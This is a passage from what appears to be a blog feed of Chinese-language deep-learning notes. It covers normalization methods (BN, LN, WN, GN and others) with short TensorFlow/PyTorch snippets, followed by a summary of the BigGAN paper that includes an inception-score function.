lazyload>的分布</p><blockquote><p>变换为均值为 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bb%7D" srcset="/img/loading.gif" lazyload>、方差为 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bg%7D%5E2" srcset="/img/loading.gif" lazyload>的分布，也并不是严格的同分布，只是映射到了一个确定的区间范围而已</p></blockquote></blockquote><ul><li>再平移调整的意义</li></ul><blockquote><ol type="1"><li>不会过分改变每一层计算结果</li><li>第一步的规范化会将几乎所有数据映射到激活函数的非饱和区（线性区），仅利用到了线性变化能力，从而降低了神经网络的表达能力。而进行再变换，则可以将数据从线性区变换到非线性区，恢复模型的表达能力（想想激活函数）</li></ol></blockquote><h2><span id="主流-normalization方法梳理"><strong>主流 Normalization方法梳理</strong></span></h2><ol type="1"><li><strong>Batch Normalization ——纵向规范化</strong>：整个batch的不同维度（channel）</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/简述_pic/image-20200707230136648.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p><img src="https://www.zhihu.com/equation?tex=%5Cmu_i+%3D+%5Cfrac%7B1%7D%7BM%7D%5Csum%7Bx_i%7D%2C+%5Cquad+%5Csigma_i%3D+%5Csqrt%7B%5Cfrac%7B1%7D%7BM%7D%5Csum%7B%28x_i-%5Cmu_i%29%5E2%7D%2B%5Cepsilon+%7D%5C%5C" srcset="/img/loading.gif" lazyload></p><p>其中 <img src="https://www.zhihu.com/equation?tex=M" srcset="/img/loading.gif" lazyload> 是 mini-batch的大小。由于 BN 是针对单个维度定义的，因此标准公式中的计算均为element-wise。</p><p>然后，用一个 mini-batch 的一阶统计量和二阶统计量，规范每一个输入维度<img src="https://www.zhihu.com/equation?tex=x_i" srcset="/img/loading.gif" lazyload></p><p><strong>KEYPOINT</strong>：mini-batch数据决定，x每个维度的分布，上图可理解为RGB三个通道。</p><p>要求：每个 mini-batch 比较大，数据分布比较接近，充分的 shuffle</p><p>不适用：动态的网络结构 和 RNN 网络 （最后才知道mini-batch的<span class="math inline">\(\mu\)</span>）。Batch Normalization基于一个minibatch的数据计算均值和方差，而不是基于整个Trainingset来做，相当于进行梯度计算式引入噪声。因此，BatchNormalization不适用于对噪声敏感的强化学习、生成模型（Generativemodel：GAN，VAE）使用。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">batch_normalization_layer</span><span class="hljs-params">(inputs, out_size, isTrain=True)</span>:</span><br>    <span class="hljs-comment"># in_size, out_size = inputs.get_shape()</span><br>    pop_mean = tf.Variable(tf.zeros([out_size]),trainable=<span class="hljs-literal">False</span>)<br>    pop_var = tf.Variable(tf.ones([out_size]),trainable=<span class="hljs-literal">False</span>)<br>    scale = tf.Variable(tf.ones([out_size]))<br>    shift = tf.Variable(tf.zeros([out_size]))<br>    eps = <span class="hljs-number">0.001</span><br>    decay = <span class="hljs-number">0.999</span><br>    <span class="hljs-keyword">if</span> isTrain:<br>        <span class="hljs-comment"># batch的mean和var。 注原始维度为[batch_size, height, width, channel]</span><br>        batch_mean, batch_var = tf.nn.moments(inputs,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>])<br>        print(batch_mean.get_shape())<br>        <span class="hljs-comment"># 记录训练的mean和var</span><br>        train_mean = tf.assign(pop_mean, pop_mean * decay + batch_mean * (<span class="hljs-number">1</span>-decay))<br>        train_var = tf.assign(pop_var, pop_var * decay + batch_var * (<span class="hljs-number">1</span>-decay))<br>        <span class="hljs-keyword">with</span> tf.control_dependencies([train_mean,train_var]):<br>            <span class="hljs-keyword">return</span> tf.nn.batch_normalization(inputs,batch_mean,batch_var,shift,scale,eps)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> tf.nn.batch_normalization(inputs,pop_mean,pop_var,shift,scale,eps)<br></code></pre></div></td></tr></table></figure><ol start="2" type="1"><li><strong>Layer Normalization —— 横向规范化</strong>：单个输入https://arxiv.org/abs/1607.06450</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/简述_pic/image-20200707230153204.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>考虑一层所有维度的输入，计算该层的平均输入值和输入方差，然后用同一个规范化操作来转换各个维度的输入</p><p><img src="https://www.zhihu.com/equation?tex=%5Cmu+%3D+%5Csum_i%7Bx_i%7D%2C+%5Cquad+%5Csigma%3D+%5Csqrt%7B%5Csum_i%7B%28x_i-%5Cmu%29%5E2%7D%2B%5Cepsilon+%7D%5C%5C" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.zhihu.com/equation?tex=i" srcset="/img/loading.gif" lazyload>枚举了该层所有的输入神经元。对应到标准公式中，四大参数 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7B%5Cmu%7D" srcset="/img/loading.gif" lazyload>, <img src="https://www.zhihu.com/equation?tex=%5Cbold%7B%5Csigma%7D" srcset="/img/loading.gif" lazyload>, <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bg%7D" srcset="/img/loading.gif" lazyload>, <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bb%7D" srcset="/img/loading.gif" lazyload>均为标量（BN中是向量），<strong>所有输入共享一个规范化变换</strong></p><p><strong>KEYPOINT</strong>：LN 针对单个训练样本进行，用于小mini-batch场景、动态网络场景和 RNN，特别是自然语言处理领域。此外，LN不需要保存 mini-batch 的均值和方差，节省了额外的存储空间</p><p><strong>NOTE</strong>：如果不同输入特征不属于相似的类别（比如颜色和大小），那么LN 的处理可能会降低模型的表达能力。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">layer_norm</span><span class="hljs-params">(Function)</span>:</span><br><span class="hljs-meta">@staticmethod</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(input, gain=None, bias=None)</span>:</span><br>        <span class="hljs-comment"># 这里的输入是unroll的，[batch_size, h x w x c]，按实例norm</span><br>mean = input.mean(<span class="hljs-number">-1</span>, keepdim=<span class="hljs-literal">True</span>)<br>var = input.var(<span class="hljs-number">-1</span>, unbiased=<span class="hljs-literal">False</span>, keepdim=<span class="hljs-literal">True</span>)<br>input_normalized = (input - mean) / torch.sqrt(var + <span class="hljs-number">1e-9</span>)<br><br><span class="hljs-keyword">if</span> gain <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>output = input_normalized * gain + bias<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> (gain <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> bias <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):<br><span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"gain and bias of LayerNorm should be both None or not None!"</span>)<br><span class="hljs-keyword">else</span>:<br>output = input_normalized<br><br><span class="hljs-keyword">return</span> output<br>...<br></code></pre></div></td></tr></table></figure><ol start="3" type="1"><li><strong>Weight Normalization —— 参数规范化</strong>https://arxiv.org/abs/1602.07868</li></ol><p>将以下方程<img src="https://www.zhihu.com/equation?tex=h%3Df%5Cleft%28%5Cbold%7Bg%7D%5Ccdot%5Cfrac%7B%5Cbold%7Bx%7D-%5Cbold%7B%5Cmu%7D%7D%7B%5Cbold%7B%5Csigma%7D%7D%2B%5Cbold%7Bb%7D%5Cright%29%5C%5C" srcset="/img/loading.gif" lazyload></p><p>理解为： <img src="https://www.zhihu.com/equation?tex=f_%5Cbold%7Bw%7D%28%5Cbold%7Bx%7D%29%3D%5Cbold%7Bw%7D%5Ccdot%5Cbold%7Bx%7D" srcset="/img/loading.gif" lazyload>.</p><ul><li><p>BN 和 LN 均将规范化应用于输入的特征数据 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bx%7D" srcset="/img/loading.gif" lazyload></p></li><li><p><strong>WN将规范化应用于线性变换的权重</strong> <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bw%7D" srcset="/img/loading.gif" lazyload></p></li></ul><p>用神经元的权重的欧氏范数对输入数据进行 scale。</p><p><img src="https://www.zhihu.com/equation?tex=+f_%5Cbold%7Bw%7D%28WN%28%5Cbold%7Bx%7D%29%29%3D%5Cbold%7Bw%7D%5Ccdot+WN%28%5Cbold%7Bx%7D%29+%3D+g%5Ccdot%5Cfrac%7B%5Cbold%7Bv%7D%7D%7B%5Cbold%7B%7C%7Cv%7C%7C%7D%7D+%5Ccdot%5Cbold%7Bx%7D+%5C%5C%3D+%5Cbold%7Bv%7D%5Ccdot+g%5Ccdot%5Cfrac%7B%5Cbold%7Bx%7D%7D%7B%5Cbold%7B%7C%7Cv%7C%7C%7D%7D%3Df_%5Cbold%7Bv%7D%28g%5Ccdot%5Cfrac%7B%5Cbold%7Bx%7D%7D%7B%5Cbold%7B%7C%7Cv%7C%7C%7D%7D%29" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.zhihu.com/equation?tex=%5Cbold%7B%7C%7Cv%7C%7C%7D" srcset="/img/loading.gif" lazyload>是神经元的权重的欧氏范数，因此<img src="https://www.zhihu.com/equation?tex=%5Chat%7B%5Cbold%7Bv%7D%7D" srcset="/img/loading.gif" lazyload>是单位向量，决定了 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bw%7D" srcset="/img/loading.gif" lazyload>的方向；</p><p><img src="https://www.zhihu.com/equation?tex=g" srcset="/img/loading.gif" lazyload> 是标量，决定了<img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bw%7D" srcset="/img/loading.gif" lazyload>的长度。</p><p><img src="https://www.zhihu.com/equation?tex=%7C%7C%7B%5Cbold%7Bw%7D%7D%7C%7C+%5Cequiv+%7Cg%7C" srcset="/img/loading.gif" lazyload></p><p><strong>KEYPOINT</strong>：WN的规范化不直接使用输入数据的统计量，因此避免了 BN 过于依赖 mini-batch的不足，以及 LN 每层唯一转换器的限制，同时也可以用于动态网络结构</p><p>WeightNormalization对通过标量g和向量v对权重W进行重写，重写向量v是固定的，因此，基于WeightNormalization的Normalization比Batch Normalization引入更少的噪声。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_weight_norm</span><span class="hljs-params">(v, g)</span>:</span><br>    <span class="hljs-string">'v就是weights'</span><br>    norm = torch.norm(v, <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> v * (g * norm)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">norm_except_dim</span><span class="hljs-params">(v, pow, dim)</span>:</span><br>    <span class="hljs-string">'计算g： norm_except_dim(weight, 2, dim).data'</span><br>    <span class="hljs-keyword">if</span> dim <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> v.norm()<br>    <span class="hljs-keyword">if</span> dim != <span class="hljs-number">0</span>:<br>        v = v.transpose(<span class="hljs-number">0</span>, dim)<br>    output_size = (v.size(<span class="hljs-number">0</span>),) + (<span class="hljs-number">1</span>,) * (v.dim() - <span class="hljs-number">1</span>)<br>    v = v.contiguous().view(v.size(<span class="hljs-number">0</span>), <span class="hljs-number">-1</span>).norm(dim=<span class="hljs-number">1</span>).view(*output_size)<br>    <span class="hljs-keyword">if</span> dim != <span class="hljs-number">0</span>:<br>        v = v.transpose(<span class="hljs-number">0</span>, dim)<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WeightNorm</span>:</span><br>...<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">compute_weight</span><span class="hljs-params">(self, module)</span>:</span><br>        g = getattr(module, self.name + <span class="hljs-string">'_g'</span>)<br>        v = getattr(module, self.name + <span class="hljs-string">'_v'</span>)<br>        <span class="hljs-keyword">return</span> _weight_norm(v, g)<br>    ...<br></code></pre></div></td></tr></table></figure><ol start="4" type="1"><li><strong>Cosine Normalization —— 余弦规范化</strong></li></ol><p><img src="https://www.zhihu.com/equation?tex=f_%5Cbold%7Bw%7D%28%5Cbold%7Bx%7D%29%3Dcos+%5Ctheta+%3D+%5Cfrac%7B%5Cbold%7Bw%7D%5Ccdot%5Cbold%7Bx%7D%7D%7B%5Cbold%7B%7C%7Cw%7C%7C%7D%5Ccdot%5Cbold%7B%7C%7Cx%7C%7C%7D%7D%5C%5C" srcset="/img/loading.gif" lazyload></p><p>其中 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" srcset="/img/loading.gif" lazyload> 是<img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bw%7D" srcset="/img/loading.gif" lazyload> 和 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bx%7D" srcset="/img/loading.gif" lazyload>的夹角。所有的数据就都是 [-1, 1] 区间。</p><p>超简单的变化，直接在wx的上scale，并且不需要再次缩放。</p><p>将 点积》》》变为余弦相似度</p><ol start="5" type="1"><li><strong>Instance Norm</strong></li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/简述_pic/image-20200707230250211.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>InstanceNorm等价于当<strong>GroupNorm</strong>的<strong>num_groups等于num_channel</strong>.</p><ol start="6" type="1"><li><strong>Group Norm</strong> https://arxiv.org/abs/1803.08494</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/简述_pic/image-20200707230332377.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>当<strong>Group Norm中group</strong>的数量是1的时候,是与LayerNorm是等价的</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GroupNorm</span><span class="hljs-params">(x, gamma, beta, G, eps=<span class="hljs-number">1</span>e−<span class="hljs-number">5</span>)</span>:</span><br>    <span class="hljs-comment"># x: input features with shape [N,C,H,W]</span><br>    <span class="hljs-comment"># gamma, beta: scale and offset, with shape [1,C,1,1]</span><br>    <span class="hljs-comment"># G: number of groups for GN</span><br>    N, C, H, W = x.shape<br>    <span class="hljs-comment"># group划分</span><br>    x = tf.reshape(x, [N, G, C // G, H, W])<br>    <span class="hljs-comment"># 按group求mean var</span><br>    mean, var = tf.nn.moments(x, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], keepdims=<span class="hljs-literal">True</span>)<br>    <br>    x = (x−mean) / tf.sqrt(var + eps)<br>    x = tf.reshape(x, [N, C, H, W])<br>    <span class="hljs-keyword">return</span> x∗gamma + beta<br></code></pre></div></td></tr></table></figure><h2><span id="normalization为什么会有效"><strong>Normalization为什么会有效？</strong></span></h2><ol type="1"><li><strong>权重伸缩不变性（weight scale invariance）</strong></li></ol><p><img src="https://www.zhihu.com/equation?tex=Norm%28%5Cbold%7BW%27%7D%5Cbold%7Bx%7D%29%3DNorm%28%5Cbold%7BW%7D%5Cbold%7Bx%7D%29%5C%5C" srcset="/img/loading.gif" lazyload></p><p>其中 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7BW%27%7D%3D%5Clambda%5Cbold%7BW%7D" srcset="/img/loading.gif" lazyload>。</p><p>由于</p><p><img src="https://www.zhihu.com/equation?tex=%5Cfrac%7B%5Cpartial+Norm%28%5Cbold%7BW%27x%7D%29%7D%7B%5Cpartial+%5Cbold%7Bx%7D%7D+%3D+%5Cfrac%7B%5Cpartial+Norm%28%5Cbold%7BWx%7D%29%7D%7B%5Cpartial+%5Cbold%7Bx%7D%7D+%5C%5C" srcset="/img/loading.gif" lazyload></p><p>因此，权重的伸缩变化不会影响反向梯度的 Jacobian矩阵，因此也就对反向传播没有影响，避免了反向传播时因为权重过大或过小导致的<strong>梯度消失或梯度爆炸</strong>问题，从而加速了神经网络的训练</p><ol start="2" type="1"><li><strong>参数正则</strong></li></ol><p>由于 <img src="https://www.zhihu.com/equation?tex=%5Cfrac%7B%5Cpartial+Norm%28%5Cbold%7BW%27x%7D%29%7D%7B%5Cpartial+%5Cbold%7BW%27%7D%7D+%3D%5Cfrac%7B1%7D%7B+%5Clambda%7D%5Ccdot+%5Cfrac%7B%5Cpartial+Norm%28%5Cbold%7BWx%7D%29%7D%7B%5Cpartial%5Cbold%7BW%7D%7D+%5C%5C" srcset="/img/loading.gif" lazyload></p><p>因此，下层的权重值越大，<span class="math inline">\(\lambda\)</span>越大，那么其梯度就越小。这样，参数的变化就越稳定，相当于实现了参数正则化的效果，避免参数的大幅震荡，提高网络的泛化性能。</p><ol start="3" type="1"><li><strong>数据伸缩不变性（data scale invariance）</strong></li></ol><p>当数据 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bx%7D" srcset="/img/loading.gif" lazyload> 按照常量 <img src="https://www.zhihu.com/equation?tex=%5Clambda" srcset="/img/loading.gif" lazyload>进行伸缩时，得到的规范化后的值保持不变，即：<img src="https://www.zhihu.com/equation?tex=Norm%28%5Cbold%7BW%7D%5Cbold%7Bx%27%7D%29%3DNorm%28%5Cbold%7BW%7D%5Cbold%7Bx%7D%29%5C%5C" srcset="/img/loading.gif" lazyload></p><p>其中 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bx%27%7D%3D%5Clambda%5Cbold%7Bx%7D" srcset="/img/loading.gif" lazyload>。</p><p><strong>数据伸缩不变性仅对 BN、LN 和 CN 成立。</strong>WN不具有这一性质。很明显。</p><ol start="4" type="1"><li><strong>数据伸缩不变性可以有效地减少梯度弥散，简化对学习率的选择</strong></li></ol><p>某一层神经元 <img src="https://www.zhihu.com/equation?tex=h_l%3Df_%7B%5Cbold%7BW%7D_l%7D%28%5Cbold%7Bx%7D_l%29" srcset="/img/loading.gif" lazyload>而言，展开可得（以下式子为示意，没写入激活函数）</p><p><img src="https://www.zhihu.com/equation?tex=h_l%3Df_%7B%5Cbold%7BW%7D_l%7D%28%5Cbold%7Bx%7D_l%29%3Df_%7B%5Cbold%7BW%7D_l%7D%28f_%7B%5Cbold%7BW%7D_%7Bl-1%7D%7D%28%5Cbold%7Bx%7D_%7Bl-1%7D%29%29%3D%5Ccdots%3D%5Cbold%7Bx%7D_0%5Cprod_%7Bk%3D0%7D%5El%5Cbold%7BW%7D_k%5C%5C" srcset="/img/loading.gif" lazyload></p><p>每一层神经元的输出依赖于底下各层的计算结果。再次回忆activitionfunction的图像</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//简述.assets/1566535024691.png" srcset="/img/loading.gif" lazyload></p><p>如果没有正则化，当下层输入发生伸缩变化时，经过层层传递，可能会导致数据发生剧烈的膨胀或者弥散，从而也导致了反向计算时的梯度爆炸或梯度弥散。</p><p><img src="https://www.zhihu.com/equation?tex=h_l%3Df_%7B%5Cbold%7BW%7D_l%7D%28%5Cbold%7Bx%7D_l%29" srcset="/img/loading.gif" lazyload>而言，其输入 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bx%7D_l" srcset="/img/loading.gif" lazyload>永远保持标准的分布，这就使得高层的训练更加简单。从梯度的计算公式来看：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cfrac%7B%5Cpartial+Norm%28%5Cbold%7BWx%27%7D%29%7D%7B%5Cpartial+%5Cbold%7BW%7D%7D+%3D+%5Cfrac%7B%5Cpartial+Norm%28%5Cbold%7BWx%7D%29%7D%7B%5Cpartial%5Cbold%7BW%7D%7D+%5C%5C" srcset="/img/loading.gif" lazyload></p><p>数据的伸缩变化也不会影响到对该层的权重参数更新，使得训练过程更加鲁棒，简化了对学习率的选择。</p><p>参考链接：https://zhuanlan.zhihu.com/p/33173246</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deep learning </tag>
            
            <tag> normalization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large scale GAN training for high fidelity natural image synthesis</title>
      <link href="/posts/204efe7c.html"/>
      <url>/posts/204efe7c.html</url>
      
        <content type="html"><![CDATA[<h2><span id="问题">问题</span></h2><p>GAN生成图像的过程是一个敏感的过程。虽然相比于VAE，其优化目标从Elmo最优损失函数的一个下界，变为直接优化生成结果和目标之间差异损失本身，直觉上是一种更好的方法，但是由于动态地交叉训练生成器与判别器，导致对网络设计、训练方法、参数设置等非常敏感。</p><p>尽管有研究表明在经验和理论上，获得了在多种设置中可以实现稳定训练的结论。但是GAN生成网络的效果始终有点差强人意。</p><p>当前在ImageNet建模上的最佳结果仅达到了<strong>52.5的IS</strong>，而真实数据有<strong>233的IS</strong>。</p><blockquote><p>Is( inception score)：用来衡量GAN网络的两个指标:生成图片的质量和多样性</p><ul><li>entropy = -sum(p_i * log(p_i))</li></ul><p>The conditional probability captures our interest in imagequality.</p><ul><li>KL (C || M) : KL divergence = p(y|x) * (log(p(y|x)) –log(p(y)))</li></ul><p>The average of the KL divergence for all generated images. C forconditional and M for marginal distributions.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># calculate inception score in numpy</span><br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> asarray<br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> expand_dims<br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> log<br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> mean<br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> exp<br> <br><span class="hljs-comment"># calculate the inception score for p(y|x)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calculate_inception_score</span><span class="hljs-params">(p_yx， eps=<span class="hljs-number">1E-16</span>)</span>:</span><br><span class="hljs-comment"># calculate p(y)</span><br>p_y = expand_dims(p_yx.mean(axis=<span class="hljs-number">0</span>)， <span class="hljs-number">0</span>)<br><span class="hljs-comment"># kl divergence for each image</span><br>kl_d = p_yx * (log(p_yx + eps) - log(p_y + eps))<br><span class="hljs-comment"># sum over classes</span><br>sum_kl_d = kl_d.sum(axis=<span class="hljs-number">1</span>)<br><span class="hljs-comment"># average over images</span><br>avg_kl_d = mean(sum_kl_d)<br><span class="hljs-comment"># undo the logs</span><br>is_score = exp(avg_kl_d)<br><span class="hljs-keyword">return</span> is_score<br></code></pre></div></td></tr></table></figure><p>但是有一个缺陷，概率计算是建立在Inception数据集限制的1000种类别中的，不在其中的类别则无法评估，同时要达到较好的效果，计算score时，不同类别中的数据分布最好是比较均匀的。</p></blockquote><p>《<a href="https://arxiv.org/abs/1809.11096" target="_blank" rel="noopener">Large scale GAN trainingfor high fidelity natural imagesynthesis</a>》的研究正是探索生成效果的一项成果，作者成功地将GAN生成图像和真实图像之间的保真度和多样性gap大幅降低。</p><h2><span id="方法">方法</span></h2><p>高分辨率能够带来更为真实的生成图像，在这样的思想的指导下，本论文结合了GAN的各种新技术，并且分析了训练难的原因，最后提出自己的模型。</p><p>本文展示了GAN可以<strong>从训练规模中显著获益</strong>，并且能在参数数量很大和八倍Batchsize于之前最佳结果，的条件下，仍然能以2倍到4倍的速度进行训练。</p><p>作者引入了两种简单的生成架构变化，提高了可扩展性，并修改了正则化方案以提升conditioning，通过实验说明了这样可以提升性能。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/Large-scale-GAN-training-for-high-fidelity-natural-image-synthesis_pic/image-20200806164910557.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>这篇论文没有提出新的模型，只是将原有的GAN的模型：</p><ol type="1"><li>用8倍原有的batch size大小</li><li>将隐层的变量数量扩充到原有模型的4倍</li></ol><p>训练获得了很好的图片生成的效果。与此同时，在扩充了变量数量和 batchsize大小后，模型出现了不稳定的现象。</p><p>文章中对出现的不稳定现象，采用现有的比较有效的稳定训练GAN的方法，但是文中发现这样确实会稳定GAN的训练，但是同时会栖牲生成图片的质量。</p><h2><span id="实验结果">实验结果</span></h2><ul><li>研究表明按<strong>8的倍数增加批大小</strong>可以将当前最佳的<strong>IS提高46%</strong>。</li></ul><p>研究者假设这是由于每个批量覆盖了更多的模式，为生成器和鉴别器都提供了更好的梯度信息。</p><p>这种扩扆带来的值得注意的副作用是，模型以更少的迭代次数达到了更好的性能，但变得不稳定并且遭遇了完全的训练崩溃。</p><p>因此在实验中，研究者在崩溃刚好发生之后立刻停止训练，并从之前保存的检查点进行结果报告。</p><ul><li><strong>增加了每个层50%的宽度</strong>(通道数量)，进一步的<strong>21%的IS提升</strong>。</li></ul><p>生成器和鉴别器中的参数数量几乎翻倍。研究者假设这是由于模型相对于数据集复杂度的容量的增加。将深度翻倍，在ImageNetBased模型上，反而会降低性能。</p><ul><li>其他技巧</li></ul><ol type="1"><li><p>截断技巧</p><p>生成器的随机噪声输入一般使用正态分布或者均匀分布的随机数。</p><p>本文采用了<strong>截断技术</strong>，对正态分布的随机数进行截断处理，实验发现这种方法的<strong>结果最好</strong>。</p><blockquote><p>对此的直观解释是，如果网络的随机噪声输入的随机数变动范围越大，生成的样本在标准模板上的变动就越大，因此样本的多样性就越强，但真实性可能会降低。</p><p>首先用截断态分布N（0，1）随机数产生噪声向量Z，具体做法是如果随机数超出一定范围，则重新采样，使得其落在这个区间里。</p><p>这种做法称为截断技巧：向量Z的模超过某一指定阈值的随机数进行重釆样，这样可以提高单个样本的质量，但代价是降低了样本的多样性。</p></blockquote></li></ol><h2><span id="实验后分析">实验后分析</span></h2><ul><li>生成器的不稳定性</li></ul><p>本文着重对小规模时稳定，大规模时不稳定的问题进行分析。</p><p>实验中发现，权重矩阵的前3个奇异值σ0，σ1，σ2蘊含的信息最丰富。</p><p>在训练中，G的大部分层的谱范数都是正常的，但有一些是病态的，这些谱范数随着训练的进行不断的增长，最后爆炸，导致训练坍塌。</p><h2><span id="结论">结论</span></h2><ol type="1"><li>本文证明了将GAN用于多类自然图像生成任务时，<strong>加大模型的规模</strong>可以显著的提高生成的图像的质量，对生成的样本的<strong>真实性和多样性</strong>都是如此。</li><li>通过使用一些技巧，本文提出的方法的性能较之前的方法有了大度的提高。</li><li>另外，还分析了大规模GAN在训练时的机制，用它们的权重矩阵的奇异值来刻画它们的稳定性。</li><li>讨论了稳定性和性能即生成的图像的质量之间的相互作用和影响</li></ol><p>参考链接：</p><p>百度论文复现课程：https://aistudio.baidu.com/aistudio/education/group/info/1340</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Project使用外部库</title>
      <link href="/posts/b7fe0c52.html"/>
      <url>/posts/b7fe0c52.html</url>
      
